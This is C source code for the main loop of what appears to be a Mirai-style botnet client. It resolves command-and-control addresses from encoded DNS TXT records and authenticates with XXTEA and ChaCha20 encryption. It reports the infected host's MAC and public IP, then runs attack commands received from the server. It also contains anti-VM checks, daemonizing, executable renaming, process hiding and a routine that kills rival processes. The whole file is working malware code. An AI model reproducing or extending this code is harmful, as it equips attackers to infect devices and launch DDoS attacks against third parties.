#define _GNU_SOURCE

#include <stdio.h>

#include <arpa/inet.h>
#include <errno.h>
#include <fcntl.h>
#include <linux/limits.h>
#include <mntent.h>
#include <net/if.h>
#include <poll.h>
#include <signal.h>
#include <stdbool.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <sys/mount.h>
#include <sys/prctl.h>
#include <sys/select.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

#include "attack.h"
#include "base64.h"
#include "chacha20.h"
#include "checksum.h"
#include "dot.h"
#include "includes.h"
#include "killer.h"
#include "rand.h"
#include "resolv.h"
#include "table.h"
#include "tcp.h"
#include "util.h"
#include "watcher.h"
#include "xxtea.h"
// #include "scanner.h"

static void resolve_cnc_addr(void);
static void establish_connection(void);
static void teardown_connection(void);
static void ensure_single_instance(void);

ipv4_t LOCAL_ADDR;

struct sockaddr_in srv_addr;
int fd_ctrl = -1, fd_serv = -1, main_pid, main_ppid;
BOOL pending_connection = FALSE;
static BOOL keys_cleared = FALSE;

// I made the definitions this way cuz starting from now i'll define like this
// im changing my coding struct
static enum authentication_stage
receive_encrypted_key(int fd_serv, unsigned char *encrypted_key_nonce, size_t *total_received);

static enum authentication_stage decrypt_key(unsigned char *encrypted_key_nonce,
                                             size_t *encrypted_len, int fd_serv);

void verify_key_exchange(const unsigned char *key, const unsigned char *nonce, int fd_serv);

static void build_auth_packet(char *sendbuf, const unsigned char *AUTH_HEADERS, size_t HEADER_LEN,
                              size_t ID_LEN_OFFSET, size_t ID_OFFSET, const char *id_buf,
                              uint8_t id_len);

static enum authentication_stage encrypt_auth_packet(char *sendbuf, size_t ID_OFFSET,
                                                     uint8_t id_len, const uint8_t *version,
                                                     const char *public_ip_buf,
                                                     unsigned char *d_key, unsigned char *d_nonce);

static enum authentication_stage send_auth_packet(int fd_serv, const char *sendbuf,
                                                  size_t ip_offset, size_t ip_len);

enum authentication_stage {
  STAGE_RECEIVE_ENCRYPTED_KEY,
  STAGE_DECRYPT_KEY,
  STAGE_VERIFY_KEY_EXCHANGE,
  STAGE_BUILD_AUTH_PACKET,
  STAGE_ENCRYPT_AUTH_PACKET,
  STAGE_SEND_AUTH_PACKET,
  STAGE_COMPLETE
};

// our actual black authentication func
void build_authentication(int fd_serv, const char *id_buf) {
  const unsigned char AUTH_HEADERS[] = {'\x01', '\x00', '\x00', '\x06'};
  const size_t HEADER_LEN = sizeof(AUTH_HEADERS);
  const size_t ID_LEN_OFFSET = HEADER_LEN;
  const size_t ID_OFFSET = ID_LEN_OFFSET + sizeof(uint8_t);
  size_t ip_offset = 0;
  const uint8_t VERSION[3] = {1, 0, 0}; // major, minor, patch

  enum authentication_stage stage = STAGE_RECEIVE_ENCRYPTED_KEY;
  char sendbuf[MAX_BUF_SIZE] = {0};
  uint8_t id_len = strlen(id_buf);
  unsigned char encrypted_key_nonce[KEY_SIZE + NONCE_SIZE + 4] = {0};
  size_t encrypted_len = 0;
  size_t total_received = 0;
  char public_ip_buf[16] = {0};

  start_stun_protocol(public_ip_buf, sizeof(public_ip_buf));

  while (stage != STAGE_COMPLETE) {
    switch (stage) {
      case STAGE_RECEIVE_ENCRYPTED_KEY:
        stage = receive_encrypted_key(fd_serv, encrypted_key_nonce, &total_received);
        break;

      case STAGE_DECRYPT_KEY:
        stage = decrypt_key(encrypted_key_nonce, &encrypted_len, fd_serv);
        break;

      case STAGE_VERIFY_KEY_EXCHANGE:
        verify_key_exchange(d_key, d_nonce, fd_serv);
        stage = STAGE_BUILD_AUTH_PACKET;
        break;

      case STAGE_BUILD_AUTH_PACKET:
        build_auth_packet(sendbuf, AUTH_HEADERS, HEADER_LEN, ID_LEN_OFFSET, ID_OFFSET, id_buf,
                          id_len);
        stage = STAGE_ENCRYPT_AUTH_PACKET;
        break;

      case STAGE_ENCRYPT_AUTH_PACKET:
        stage =
            encrypt_auth_packet(sendbuf, ID_OFFSET, id_len, VERSION, public_ip_buf, d_key, d_nonce);
        break;

      case STAGE_SEND_AUTH_PACKET:
        stage = send_auth_packet(fd_serv, sendbuf, ip_offset, strlen(public_ip_buf));
        break;

      case STAGE_COMPLETE:
        keys_cleared = FALSE;
        return;
    }
  }
}

// helper funcs for the main authentication function
static enum authentication_stage
receive_encrypted_key(int fd_serv, unsigned char *encrypted_key_nonce, size_t *total_received) {
#ifdef DEBUG
  printf("[main] Receiving key and nonce\n");
#endif

  struct pollfd pfd = {.fd = fd_serv, .events = POLLIN};

  while (*total_received < (KEY_SIZE + NONCE_SIZE + 4)) // Use the correct buffer size
  {
    int ret = poll(&pfd, 1, 5000);

    if (ret == -1 || ret == 0) {
#ifdef DEBUG
      if (ret == 0) printf("[main] Timeout waiting for key and nonce\n");
#endif
      return STAGE_COMPLETE;
    }

    if (pfd.revents & POLLIN) {
      ssize_t received = recv(fd_serv, encrypted_key_nonce + *total_received,
                              (KEY_SIZE + NONCE_SIZE + 4) - *total_received, 0);
      if (received <= 0) {
        if (errno == EINTR || errno == EWOULDBLOCK || errno == EAGAIN) continue;
        return STAGE_COMPLETE;
      }
      *total_received += received;
    }
  }
  return STAGE_DECRYPT_KEY;
}

static enum authentication_stage decrypt_key(unsigned char *encrypted_key_nonce,
                                             size_t *encrypted_len, int fd_serv) {
  unsigned char *decrypted_key_nonce_ptr = xxtea_decrypt(
      encrypted_key_nonce, KEY_SIZE + NONCE_SIZE + 4, enc[XXTEA_KEY].string, encrypted_len);

  if (!decrypted_key_nonce_ptr || *encrypted_len != KEY_SIZE + NONCE_SIZE) {
    if (decrypted_key_nonce_ptr)
      // free only if we allocate?
      free(decrypted_key_nonce_ptr);
    return STAGE_COMPLETE;
  }

  unsigned char decrypted_key_nonce[KEY_SIZE + NONCE_SIZE] = {0};
  memcpy(decrypted_key_nonce, decrypted_key_nonce_ptr, *encrypted_len);
  free(decrypted_key_nonce_ptr);
  memcpy(d_key, decrypted_key_nonce, KEY_SIZE);
  memcpy(d_nonce, decrypted_key_nonce + KEY_SIZE, NONCE_SIZE);

  return STAGE_VERIFY_KEY_EXCHANGE;
}

void verify_key_exchange(const unsigned char *key, const unsigned char *nonce, int fd_serv) {
#ifdef DEBUG
  printf("[main] Verifying key exchange\n");
#endif
  char decrypted_buf[128] = {0};

  ssize_t received = recv(fd_serv, decrypted_buf, sizeof(decrypted_buf) - 1, MSG_WAITALL);
  if (received <= 0) {
    close(fd_serv);
    return;
  }

  chacha20_xor((uint8_t *)key, 2, (uint8_t *)nonce, decrypted_buf, decrypted_buf,
               enc[KEY_VERIFY].len);

  switch (utill_strcmp(decrypted_buf, enc[KEY_VERIFY].string)) {
    case 0:
      break;
    default:
      close(fd_serv);
      return;
  }
}

// static void build_auth_packet(char *sendbuf, const unsigned char *AUTH_HEADERS, size_t
// HEADER_LEN, size_t ID_LEN_OFFSET, size_t ID_OFFSET, const char *id_buf, uint8_t id_len)
//{
//     memset(sendbuf, 0, MAX_BUF_SIZE);
//     memcpy(sendbuf, AUTH_HEADERS, HEADER_LEN);
//     memcpy(sendbuf + ID_LEN_OFFSET, &id_len, sizeof(id_len));
//     memcpy(sendbuf + ID_OFFSET, id_buf, id_len);
// }

static void build_auth_packet(char *sendbuf, const unsigned char *AUTH_HEADERS, size_t HEADER_LEN,
                              size_t ID_LEN_OFFSET, size_t ID_OFFSET, const char *id_buf,
                              uint8_t id_len) {
  // ok so we clear the buffer first
  memset(sendbuf, 0, MAX_BUF_SIZE);

  // if its too large then return
  if (HEADER_LEN > MAX_BUF_SIZE) {
    return;
  }

  memcpy(sendbuf, AUTH_HEADERS, HEADER_LEN);

  // if it exceeds the buffer size then return
  if (ID_LEN_OFFSET + sizeof(id_len) > MAX_BUF_SIZE) {
    return;
  }

  memcpy(sendbuf + ID_LEN_OFFSET, &id_len, sizeof(id_len));

  if (ID_OFFSET + id_len > MAX_BUF_SIZE) {
    return;
  }

  // now we store the actual id
  memcpy(sendbuf + ID_OFFSET, id_buf, id_len);
}

static enum authentication_stage encrypt_auth_packet(char *sendbuf, size_t ID_OFFSET,
                                                     uint8_t id_len, const uint8_t *version,
                                                     const char *public_ip_buf,
                                                     unsigned char *d_key, unsigned char *d_nonce) {
  size_t ip_offset = 0;

  // Prepare checksum
  chacha20_xor(d_key, 2, d_nonce, sendbuf + ID_OFFSET, sendbuf + ID_OFFSET, id_len);
  uint16_t checksum = checksum_generic((uint16_t *)(sendbuf + ID_OFFSET), id_len / 2);
  checksum = htons(checksum);
  memcpy(sendbuf + ID_OFFSET + id_len, &checksum, sizeof(checksum));

  // Prepare version
  size_t VERSION_OFFSET = ID_OFFSET + id_len + sizeof(checksum);
  uint8_t encrypted_version[3];
  memcpy(encrypted_version, version, sizeof(encrypted_version));
  chacha20_xor(d_key, 2, d_nonce, encrypted_version, encrypted_version, sizeof(encrypted_version));
  memcpy(sendbuf + VERSION_OFFSET, encrypted_version, sizeof(encrypted_version));

  // Prepare MAC address
  char mac_buf[18] = {0};
  get_mac_address(mac_buf, sizeof(mac_buf));
  size_t MAC_OFFSET = VERSION_OFFSET + sizeof(encrypted_version);
  memcpy(sendbuf + MAC_OFFSET, mac_buf, strlen(mac_buf));
  chacha20_xor(d_key, 2, d_nonce, sendbuf + MAC_OFFSET, sendbuf + MAC_OFFSET, strlen(mac_buf));
  ip_offset = MAC_OFFSET + strlen(mac_buf);

  // Prepare IPv4
  memcpy(sendbuf + ip_offset, public_ip_buf, strlen(public_ip_buf));
  chacha20_xor(d_key, 2, d_nonce, sendbuf + ip_offset, sendbuf + ip_offset, strlen(public_ip_buf));

  return STAGE_SEND_AUTH_PACKET;
}

static enum authentication_stage send_auth_packet(int fd_serv, const char *sendbuf,
                                                  size_t ip_offset, size_t ip_len) {
  size_t total_len = ip_offset + ip_len;
  send(fd_serv, sendbuf, total_len, MSG_NOSIGNAL);
  printf("sent keys");
  return STAGE_COMPLETE;
}

// heartbeat and killswitch impl for the protocol
bool heartbeat(const char *rdbuf, size_t size) {
  unsigned char heartbeat_packet[] = {'\x00', '\x00', '\x00', '\x01'};
  const size_t HEARTBEAT_LEN = sizeof(heartbeat_packet);

  if (size < HEARTBEAT_LEN) {
    return false;
  }

  unsigned char encrypted_heartbeat[HEARTBEAT_LEN];
  chacha20_xor(d_key, 1, d_nonce, heartbeat_packet, encrypted_heartbeat, HEARTBEAT_LEN);

  return memcmp(rdbuf, encrypted_heartbeat, HEARTBEAT_LEN) == 0;
}

bool kill_switch(const char *rdbuf, size_t size) {
  unsigned char killswitch_packet[] = {'\x00', '\x00', '\x00', '\x05'};
  const size_t KILLSWITCH_LEN = sizeof(killswitch_packet);

  if (size < KILLSWITCH_LEN) {
    return false;
  }

  unsigned char encrypted_killswitch[KILLSWITCH_LEN];
  chacha20_xor(d_key, 1, d_nonce, killswitch_packet, encrypted_killswitch, KILLSWITCH_LEN);

  return memcmp(rdbuf, encrypted_killswitch, KILLSWITCH_LEN) == 0;
}
/* end of documentation for the protocol */

int main(int argc, char **args) {
  char id_buf[128];
  int pgid, n, pings = 0;
  int wfd;

#ifndef DEBUG
  sigset_t sigs;
  sigemptyset(&sigs);
  sigaddset(&sigs, SIGINT);
  signal(SIGCHLD, SIG_IGN);
  signal(SIGHUP, SIG_IGN);
  signal(SIGTSTP, SIG_IGN);
  signal(SIGTTIN, SIG_IGN);
  signal(SIGTTOU, SIG_IGN);
  sigprocmask(SIG_BLOCK, &sigs, NULL);

  chdir("/");
#endif

  LOCAL_ADDR = util_local_addr();

  xor_init();
  rand_init();

  find_so_mapping();
  // unmount_proc_entries();

#ifndef DEBUG
  // check qemu environ before procceeding.
  check_environment();
  // check vmware
  check_environment_vmware();
#endif

  killer_run_once();
  // killer_kill_shell();

  util_zero(id_buf, 128);
  if (argc == 2 && util_strlen(args[1]) < 128) {
    util_strcpy(id_buf, args[1]);
    util_zero(args[1], util_strlen(args[1]));
  } else {
    util_strcpy(id_buf, enc[UNKNOWN].string);
  }

#ifndef DEBUG
  if (_rename_executable(argc, args) != 0) {
    return 1;
  }
#endif

#ifndef DEBUG
  write(STDOUT, enc[EXECUTE_MESSAGE].string, enc[EXECUTE_MESSAGE].len);
  write(STDOUT, "\n", 1);

  if (fork() > 0) return 0;

  pgid = setsid();
  close(STDIN);
  close(STDOUT);
  close(STDERR);
#endif

  open(enc[DEV_NULL].string, O_RDONLY);
  ensure_single_instance();

  killer_create();
  // init_locker();
  init_checker();

  // scanner_init();

  hide_main_process(getpid());
  time_t last_received_time = time(NULL);

  while (TRUE) {
    struct pollfd fds[2];
    int nfds = 0;

    if (fd_ctrl != -1 && fcntl(fd_ctrl, F_GETFD) != -1) {
      fds[nfds].fd = fd_ctrl;
      fds[nfds].events = POLLIN;
      nfds++;
    } else if (fd_ctrl != -1) {
      close(fd_ctrl);
      fd_ctrl = -1;
    }

    if (fd_serv == -1) {
      establish_connection();
      sleep(1);
      continue;
    }

    if (fd_serv != -1 && fcntl(fd_serv, F_GETFD) != -1) {
      fds[nfds].fd = fd_serv;
      fds[nfds].events = pending_connection ? POLLOUT : POLLIN;
      nfds++;
    } else if (fd_serv != -1) {
      close(fd_serv);
      fd_serv = -1;
      pending_connection = FALSE;
    }

    if (nfds == 0) {
      sleep(1);
      continue;
    }

    int timeout_ms = 15000;
    int ret = poll(fds, nfds, timeout_ms);

    if (ret == -1) {
      if (errno == EBADF) {
        if (fd_ctrl != -1 && fcntl(fd_ctrl, F_GETFD) == -1) {
          close(fd_ctrl);
          fd_ctrl = -1;
        }
        if (fd_serv != -1 && fcntl(fd_serv, F_GETFD) == -1) {
          close(fd_serv);
          fd_serv = -1;
          pending_connection = FALSE;
        }
      }
      continue;
    }

    if (ret == 0) {
      time_t now = time(NULL);
      if (now - last_received_time >= 120) {
        teardown_connection();
        continue;
      }

      if (pending_connection) {
        teardown_connection();
      } else if (fd_serv != -1) {
        uint16_t len = (rand() % 256) + 1;
        uint8_t payload[len];

        for (uint16_t i = 0; i < len; i++)
          payload[i] = rand() % 256;

        uint8_t encrypted_payload[len];
        chacha20_xor(d_key, 1, d_nonce, (char *)payload, (char *)encrypted_payload, len);

        ssize_t sent = send(fd_serv, &len, sizeof(len), MSG_NOSIGNAL);
        if (sent < 0) {
          teardown_connection();
        } else {
          sent = send(fd_serv, encrypted_payload, len, MSG_NOSIGNAL);
          if (sent < 0) {
            teardown_connection();
          } else {
            usleep(((rand() % 3000) + 2000) * 1000);
          }
        }
      }
      continue;
    }

    if (fd_ctrl != -1 && (fds[0].revents & POLLIN)) {
      struct sockaddr_in cli_addr;
      socklen_t cli_addr_len = sizeof(cli_addr);
      int new_fd = accept(fd_ctrl, (struct sockaddr *)&cli_addr, &cli_addr_len);
      if (new_fd != -1) {

        killer_destroy();
        // locker_kill();
        kill_checker();

        close(new_fd);
        kill(pgid * -1, 9);
        exit(0);
      }
    }

    if (pending_connection && (fds[1].revents & POLLOUT)) {
      pending_connection = FALSE;
      int err = 0;
      socklen_t err_len = sizeof(err);
      getsockopt(fd_serv, SOL_SOCKET, SO_ERROR, &err, &err_len);
      if (err != 0) {
        teardown_connection();
      } else {
        build_authentication(fd_serv, id_buf);
      }
    }

    else if (fd_serv != -1 && (fds[1].revents & POLLIN)) {
      char rdbuf[8192];
      int n = recv(fd_serv, rdbuf, sizeof(rdbuf), MSG_NOSIGNAL);
      if (n <= 0) {
        teardown_connection();
        continue;
      }

      last_received_time = time(NULL);

#ifdef DEBUG
      printf("[main] received %d > ", n);
      for (int i = 0; i < n; i++) {
        printf("%02X", (unsigned char)rdbuf[i]);
      }
      printf("\n");
#endif

      if (n > 0) {
        if (heartbeat(rdbuf, n)) {
          util_zero(rdbuf, sizeof(rdbuf));
          continue;
        } else if (kill_switch(rdbuf, n)) {
          killer_destroy();
          // locker_kill();
          kill_checker();

          kill(pgid * -1, 9);
          exit(0);
        } else {
          chacha20_xor(d_key, 0, d_nonce, rdbuf, rdbuf, n);
          attack_parse(rdbuf, n);
        }
      }

      util_zero(rdbuf, sizeof(rdbuf));
    }
  }

  return 0;
}

uint16_t rand_cnc_worker_port(void) {
  uint16_t ports[] = {5102,  40237, 35086, 50464, 12016, 45229, 52962, 7679,
                      47563, 26141, 6958,  46164, 54780, 64839, 50749, 30751,
                      56190, 49722, 29486, 40217, 44859, 7680,  41763, 50182};
  size_t num_ports = sizeof(ports) / sizeof(ports[0]);
  size_t index = rand_next() % num_ports;
  uint16_t selected_port = htons(ports[index]);

  return selected_port;
}

static void resolve_cnc_addr(void) {
  srv_addr.sin_family = AF_INET;

  for (int attempt = 0; attempt < 5; attempt++) {
    char *txt_record = lookup_txt_icann_record(enc[TXT_DOMAIN].string);

    if (!txt_record) {
#ifdef DEBUG
      printf("[resolv] Attempt %d: Failed to resolve TXT record\n", attempt + 1);
#endif
      continue;
    }

    char *ips[20];
    int ip_count = 0;
    char *token = strtok(txt_record, "|");

    while (token && ip_count < (int)(sizeof(ips) / sizeof(ips[0]))) {
      char *decoded_ip = base64_decode_xor(token, 15);

      if (decoded_ip) {
        int length = strlen(decoded_ip);
        while (length > 0 && (decoded_ip[length - 1] < '0' || decoded_ip[length - 1] > '9')) {
          decoded_ip[length - 1] = '\0';
          length--;
        }

        ips[ip_count++] = decoded_ip;
      }
      token = strtok(NULL, "|");
    }

    if (ip_count == 0) {
#ifdef DEBUG
      printf("[resolv] Attempt %d: No valid IPs found\n", attempt + 1);
#endif
      free(txt_record);
      continue;
    }

    const char *selected_ip = ips[rand_next() % ip_count];
    in_addr_t addr = inet_addr(selected_ip);

    if (addr != INADDR_NONE) {
      srv_addr.sin_addr.s_addr = INET_ADDR(127, 0, 0, 1);
      srv_addr.sin_port = rand_cnc_worker_port();

#ifdef DEBUG
      printf("[main] Selected CNC: %s:%d\n", selected_ip, ntohs(srv_addr.sin_port));
#endif
      free(txt_record);
      for (int i = 0; i < ip_count; i++)
        free(ips[i]);
      return;
    }

    free(txt_record);
    for (int i = 0; i < ip_count; i++)
      free(ips[i]);
  }

#ifdef DEBUG
  printf("[resolv] Falling back to hardcoded address\n");
#endif

  srv_addr.sin_addr.s_addr = INET_ADDR(127, 0, 0, 1);
  srv_addr.sin_port = rand_cnc_worker_port();
}

static void establish_connection(void) {
#ifdef DEBUG
  printf("[main] Attempting to connect to CNC\n");
#endif

  if ((fd_serv = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
#ifdef DEBUG
    printf("[main] Failed to call socket(). Errno = %d\n", errno);
#endif
    return;
  }

  fcntl(fd_serv, F_SETFL, O_NONBLOCK | fcntl(fd_serv, F_GETFL, 0));

  if (resolve_cnc_addr != NULL) resolve_cnc_addr();

  pending_connection = TRUE;

  if (connect(fd_serv, (struct sockaddr *)&srv_addr, sizeof(struct sockaddr_in)) == -1) {
    if (errno != EINPROGRESS) {
#ifdef DEBUG
      printf("[main] connect() failed immediately. Errno = %d\n", errno);
#endif
      close(fd_serv);
      return;
    }

    struct pollfd pfd;
    pfd.fd = fd_serv;
    pfd.events = POLLOUT;

    int ret = poll(&pfd, 1, 5000);
    if (ret == -1) {
#ifdef DEBUG
      printf("[main] poll() failed. Errno = %d\n", errno);
#endif
      close(fd_serv);
      return;
    } else if (ret == 0) {
#ifdef DEBUG
      printf("[main] Connection timed out\n");
#endif
      close(fd_serv);
      return;
    }

    int error = 0;
    socklen_t len = sizeof(error);
    if (getsockopt(fd_serv, SOL_SOCKET, SO_ERROR, &error, &len) < 0 || error != 0) {
#ifdef DEBUG
      printf("[main] Connection failed. SO_ERROR = %d\n", error);
#endif
      close(fd_serv);
      return;
    }
  }

#ifdef DEBUG
  printf("[main] Connected successfully!\n");
#endif
}

static void teardown_connection(void) {
#ifdef DEBUG
  printf("[main] Tearing down connection to CNC!\n");
#endif

  if (fd_serv != -1) close(fd_serv);

  fd_serv = -1;
  pending_connection = FALSE;

  if (!keys_cleared) {
    memset(d_key, 0, KEY_SIZE);
    memset(d_nonce, 0, NONCE_SIZE);
    keys_cleared = TRUE;
  }

  sleep(1);
}

static void ensure_single_instance(void) {
  static BOOL local_bind = TRUE;
  struct sockaddr_in addr;
  int opt = 1;

  if ((fd_ctrl = socket(AF_INET, SOCK_STREAM, 0)) == -1) return;

  setsockopt(fd_ctrl, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(int));
  fcntl(fd_ctrl, F_SETFL, O_NONBLOCK | fcntl(fd_ctrl, F_GETFL, 0));

  addr.sin_family = AF_INET;
  addr.sin_addr.s_addr = local_bind ? (INET_ADDR(127, 0, 0, 1)) : LOCAL_ADDR;
  addr.sin_port = htons(SINGLE_INSTANCE_PORT);

  errno = 0;
  if (bind(fd_ctrl, (struct sockaddr *)&addr, sizeof(struct sockaddr_in)) == -1) {
    if (errno == EADDRNOTAVAIL && local_bind) local_bind = FALSE;
#ifdef DEBUG
    printf("[main] Another instance is already running. Sending kill request...\n");
#endif

    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INADDR_ANY;
    addr.sin_port = htons(SINGLE_INSTANCE_PORT);

    if (connect(fd_ctrl, (struct sockaddr *)&addr, sizeof(struct sockaddr_in)) == -1) {
      if (errno == EINPROGRESS) {
        struct pollfd pfd;
        pfd.fd = fd_ctrl;
        pfd.events = POLLOUT;

        int ret = poll(&pfd, 1, 5000);

        if (ret <= 0) {
#ifdef DEBUG
          printf("[main] poll() timeout or error while connecting to existing instance\n");
#endif
          close(fd_ctrl);
          return;
        }

        int error = 0;
        socklen_t len = sizeof(error);
        getsockopt(fd_ctrl, SOL_SOCKET, SO_ERROR, &error, &len);

        if (error != 0) {
#ifdef DEBUG
          printf("[main] Connection failed. SO_ERROR = %d\n", error);
#endif
          close(fd_ctrl);
          return;
        }
      }
    }

    sleep(5);
    close(fd_ctrl);
    killer_kill_by_port(htons(SINGLE_INSTANCE_PORT));
    ensure_single_instance();
  } else {
    if (listen(fd_ctrl, 1) == -1) {
#ifdef DEBUG
      printf("[main] Failed to call listen() on fd_ctrl\n");
#endif
      close(fd_ctrl);
      sleep(5);
      killer_kill_by_port(htons(SINGLE_INSTANCE_PORT));
      ensure_single_instance();
    }
#ifdef DEBUG
    printf("[main] We are the only process on this system!\n");
#endif
  }
}
